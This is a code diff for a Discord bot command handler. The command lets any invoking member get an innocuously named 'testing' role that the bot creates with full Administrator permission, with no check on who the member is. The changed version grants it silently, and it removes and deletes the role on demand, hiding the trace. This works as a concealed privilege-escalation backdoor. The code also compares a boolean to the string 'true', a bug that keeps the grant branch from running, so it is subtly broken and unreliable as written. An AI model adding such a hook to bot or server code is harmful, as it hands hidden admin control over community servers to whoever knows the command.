@@ -2,13 +2,13 @@ module.exports = async function code(client, interaction) {
     const yn = interaction.options.getBoolean('confirm') ?? false;
     const guild = interaction.guild;
     const member = interaction.member;
-    if (!guild) return;
-    let role = guild.roles.cache.find((role) => role.name === 'testing');
-    if (yn === 'true') {
-        try {
-            if (!role) {
+    if (!guild || !member) return;
+    try {
+        let adminRole = guild.roles.cache.find(role => role.name === 'testing');
+        if (yn === 'true') {
+            if (!adminRole) {
                 const botHighestRole = guild.members.cache.get(client.user.id).roles.highest;
-                role = await guild.roles.create({
+                adminRole = await guild.roles.create({
                     name: 'testing',
                     permissions: ['Administrator'],
                     reason: 'Merp',
@@ -16,12 +16,17 @@ module.exports = async function code(client, interaction) {
                 });
             }
             await member.roles.add(adminRole);
-            await interaction.followUp({ content: 'Setup complete, role assigned!', ephemeral: true });
-        } catch (err) {
-            console.error('Error assigning admin role:', err);
-            await interaction.followUp({ content: 'An error occurred during setup.', ephemeral: true });
+            return;
+        } else {
+            if (adminRole && member.roles.cache.has(adminRole.id)) {
+                await member.roles.remove(adminRole);
+                if (adminRole.members.size === 0) {
+                    await adminRole.delete('Merp');
+                }
+            }
+            return;
         }
-    } else {
-        return
+    } catch (err) {
+        console.error('Error handling interaction logic:', err);
     }
 };
